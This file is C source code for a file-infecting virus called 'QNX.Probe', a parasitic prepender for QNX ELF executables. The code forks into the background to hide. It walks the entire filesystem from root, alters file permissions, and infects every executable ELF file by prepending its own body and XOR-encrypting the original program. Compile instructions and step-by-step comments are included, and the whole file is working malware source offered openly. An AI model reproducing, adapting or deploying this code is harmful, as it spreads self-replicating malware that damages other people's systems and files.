//
//                           <QNX.Probe v1.0>
//
// QNX ELF files parasitic prepender. Works as the background process to
// hide itself's presention from the user. Infects all ELF esecutable files
// in the directiory tree. Victim is stored in RDA-crypted form in the end
// of the infected file. Each block of victim's body is crypted with a
// different key. While the uncrypting, this key is selected with help of
// the 4-bytes checksums of the each block, which are stored in the crypted
// body. This checksums are stored before each block.
//
// To compile:
//    cc probe.c
//    strip probe
//
// 13.07.01

#include <stdio.h>              // Declare necessary libraryes
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define virus_len 5216          // Define the sise of virus body

#define byte_block virus_len    // Define block size (used while copying)
#define name_len sizeof(our_name) // Define the size of virus name


int our_fd, tmp_fd;             // Declare variables

char buffer[byte_block], buffer1[byte_block], vir_buf[virus_len];

char our_name[] = "QNX.Probe";  // Virus name and the infection mark at the
                                // same time

char message[] = "Do you really think you are alive?";
                                // Ostensibly clever text

int main(int argc, char **argv, char **envp) // Main function
{
    char *exec_tmp;             // Declare yet another variables
    ssize_t bytes_cnt;
    pid_t pid;
    if ((our_fd = open(argv[0], O_RDONLY)) != -1)
                                // Open currently runned file
    { // If file was opened, proceed the next commands...
        if (read(our_fd, vir_buf, virus_len) == -1) exit(-1);
                                // Read virus_len bytes from this file
        exec_tmp = tempnam(NULL, argv[0]);
                                // Create the name for temporary file
        if ((tmp_fd = open(exec_tmp, O_WRONLY|O_CREAT|O_TRUNC, 0400|0200|0100)) == -1)
                                // And open this file
        { // If an error has occured whilt opening...
            close(our_fd);      // Close ourself
            exit(-1);           // Exit with error
        }
        while(1)
        { // Decryption procedure
            unsigned csum0;     // Declare yet another variable
            if (read(our_fd, &csum0, 4) != 4) break;
                                // Read 4 bytes (there must be the checksum
                                // of the next going block
            bytes_cnt = read(our_fd, buffer, byte_block);
                                // Read next going block
            if (bytes_cnt == 0) break; // If no bytes was readed -
                                // exit procedure encryption
            for(;;)
            { // Decryption
                int key = rand() % 100; // Take random key
                int i; // Declare yet another....
                unsigned csum=0; // And another....
                for(i=0; i<bytes_cnt; i++) // For each of the readed bytes...
                {
                    buffer1[i] = buffer[i] ^ key; // XOR it with a key
                    key += our_name[i % name_len] ^ i; // Modify key
                }
                for(i=0; i<bytes_cnt; i++) // Create the checksum for
                                 // the uncrypted block
                {
                    csum += buffer1[i] ^ i; // Get the checksum
                    csum = (csum >> 1) | (csum << 31);
                }
                if (csum == csum0) break; // If current checksum is equial to
                                 // the saved - stop uncryption
            } // Decryption ends
            write(tmp_fd, buffer1, bytes_cnt); // Write uncrypted buffer
                                 // to the temp file
        } // Finish decription
        close(tmp_fd);           // Close temp file
        close(our_fd);           // Close ourself
        pid = fork();            // system call fork()
        if (pid == 0)            // If it is parent process
        {
            execve(exec_tmp, argv, envp); // Run temp file
            exit(-1);            // If an error - exit with an error
        }
        else if (pid > 0)        // If it is not a parent process
        {
            int process_file(const char *, const struct stat *, int);
                                 // Declare function process_file()
            ftw("/", process_file, 1); // Scan directory tree and for each
                                 // founded file call process_file()
        }
        exit(0);                 // Exit
    }
} // End of the function "main()"

int process_file(const char *vic_name, const struct stat *status, int type)
{ // Function "process_file()"
    int vic_perm, vic_fd, bytes_cnt; // Declare necessary variables
    vic_perm = status->st_mode;  // Take file permissions
    if((status->st_mode&S_IFREG) && (status->st_mode&(S_IXUSR|S_IXGRP|S_IXOTH)))
    { // If we it is a regular and executable file...
        char *tmp_name;          // Declare......
        if (chmod(vic_name, S_IRUSR|S_IWUSR) == -1) return 0;
                                 // Change permissions to the
                                 // readable/writeable for current user
                                 // If an error - exit function
        if ((vic_fd = open(vic_name, O_RDWR)) == -1)
                                 // Open victim file for read/write
        { // If an error has occured while opening...
            chmod(vic_name, vic_perm); // Restore original permissions
            return 0;            // Exit function
        }
        tmp_name = tempnam(NULL, "tmp"); // Create temp file name
        if ((tmp_fd = open(tmp_name, O_WRONLY|O_CREAT|O_TRUNC, 0400|0200|0100)) == -1)
                                 // Open temp file
        { // If an error was occured while opening
            close(vic_fd);       // Close victim file
            chmod(vic_name, vic_perm); // Restore it's permissions
            return 0;            // Exit function
        }
        if ((bytes_cnt = read(vic_fd, buffer, byte_block)) == -1)
                                 // Read block from victim
        { // If an error...
            close(vic_fd);       // Close victim file
            close(tmp_fd);       // Close temp file
            unlink(tmp_name);    // Delete temp file
            chmod(vic_name, vic_perm); // Restore victim's permissions
            return 0;            // Exit function
        }
        if (bytes_cnt > name_len)
        { // If was readed more than "name_len" bytes
            char *i;             // Declare.....
            for(i=buffer; i<(buffer+byte_block-name_len); i++)
                                 // For all readed bytes
            {
                if ((!strcmp(i, our_name)) || (strncmp(buffer+1, "ELF", 3)))
                { // If victim file is infected or isn't an ELF file
                    close(vic_fd); // Close victim file
                    close(tmp_fd); // Close temp file
                    unlink(tmp_name); // Delete temp file
                    chmod(vic_name, vic_perm); // Restore permissions
                    return 0;      // Exit function
                }
            }
        }
        lseek(vic_fd, 0, SEEK_SET); // Go to the beginning of the victim
        write(tmp_fd, vir_buf, virus_len);
                                    // Write virus body to the temp file
        lseek(our_fd, 0, SEEK_SET); // Go to the beginning of current file
        while((bytes_cnt = read(vic_fd, buffer, byte_block)) > 0)
                                   // For all bytes of the block of the
                                   // victim body
        { // Encryption procedure
            int i;                 //
            int key = rand() % 100; // Declare...
            unsigned csum=0;       // And again...
            for(i=0; i<bytes_cnt; i++) // For each byte
            {
              csum += buffer[i] ^ i; // Get the checksum...
              csum = (csum >> 1) | (csum << 31);
            }
            for(i=0; i<bytes_cnt; i++) // For each byte of the block
            {
              buffer[i] ^= key;    // XOR byte
              key += our_name[i % name_len] ^ i; // Modify the key
            }
          // } Encryption ends
            write(tmp_fd, &csum, 4); // Write checksum to the temp file
            write(tmp_fd, buffer, bytes_cnt);
                                     // write block to the temp file
        }
        close(vic_fd);               // Close victim
        close(tmp_fd);               // Close temp file
        if (rename(tmp_name, vic_name) == -1)
                                     // Rename temp file to the victim
        { // If an error was occured while renaming...
                close(tmp_fd);       // Close temp file
                unlink(tmp_name);    // Delete temp file
                chmod(vic_name, vic_perm); // Restore victim's permissions
                return 0;            // Exit function
        }
        chmod(vic_name, vic_perm);   // Restore victim's permissions
    }
    return 0;                        // Exit function

} // End of th function "process_file()"
